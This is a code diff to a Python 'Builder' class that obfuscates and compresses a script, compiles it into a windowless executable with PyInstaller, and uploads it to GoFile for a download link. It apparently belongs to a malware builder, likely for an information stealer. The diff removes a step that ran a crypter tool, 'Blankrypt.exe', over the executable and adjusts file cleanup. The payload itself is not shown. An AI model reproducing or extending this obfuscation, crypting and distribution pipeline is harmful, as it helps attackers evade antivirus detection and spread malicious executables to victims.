@@ -4,9 +4,9 @@ import shutil
 import subprocess
 import sys
 import time
-import requests
-
 from zlib import compress
+
+import requests
 from alive_progress import alive_bar
 from colorama import Fore, Style, init
 
@@ -79,7 +79,7 @@ class Builder:
             self.gofile_upload(self.filename)
         except:
             pass
-            
+
         run = input(
             f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to test the file? [y/n]: ')
         if run.lower() == 'y':
@@ -224,7 +224,7 @@ class Builder:
         except Exception:
             pass
         try:
-            os.rename(f"./Crypted_obfuscated_compressed_{filename}.exe", f"./{filename}.exe")
+            os.rename(f"./obfuscated_compressed_{filename}.exe", f"./{filename}.exe")
         except Exception:
             pass
 
@@ -264,10 +264,8 @@ class Builder:
         if self.obfuscation == 'y' and self.compy == 'y':
             self.encryption(f"compressed_{filename}")
             self.compile(f"obfuscated_compressed_{filename}")
-            self.exe_crypt(f"obfuscated_compressed_{filename}")
         elif self.obfuscation == 'n' and self.compy == 'y':
             self.compile(f"compressed_{filename}")
-            self.exe_crypt(f"compressed_{filename}")
         elif self.obfuscation == 'y' and self.compy == 'n':
             self.encryption(f"compressed_{filename}")
         else:
@@ -290,11 +288,6 @@ class Builder:
         os.system(f'python -m PyInstaller --hidden-import wmi --hidden-import pycryptodome --onefile --noconsole --upx-dir=./tools -i {icon} --distpath ./ .\\{filename}.py')
         print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Code compiled!{Fore.RESET}')
 
-    def exe_crypt(self, filename):
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Encrypting executable...{Fore.RESET}')
-        subprocess.run(["./tools/Blankrypt.exe", f"{filename}.exe"], capture_output=True, check=True)
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Executable encrypted!{Fore.RESET}')
-
     def run(self, filename):
         print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Attempting to execute file...')
 
@@ -310,8 +303,10 @@ class Builder:
 
         if self.obfuscation == 'y' and self.compy == 'n':
             cleans_file.remove(f'./obfuscated_compressed_{filename}.py')
+            cleans_file.remove(f'./compressed_{filename}.exe')
         elif self.obfuscation == 'y' and self.compy == 'y':
             cleans_file.add(f'./obfuscated_compressed_{filename}.spec')
+            cleans_file.remove(f'./obfuscated_compressed_{filename}.exe')
         elif self.obfuscation == 'n' and self.compy == 'n':
             cleans_file.remove(f'./{filename}.py')
         else:
@@ -334,10 +329,11 @@ class Builder:
                 continue
 
     def gofile_upload(self, filename):
-        gofile = requests.post(
-            f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(f"{filename}.exe", 'rb')}).json()['data']['downloadPage']
-        
+        gofile = requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={
+            'file': open(f"{filename}.exe", 'rb')}).json()['data']['downloadPage']
+
         print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} GoFile link: {gofile}{Fore.RESET}')
+
 
 if __name__ == '__main__':
     init()
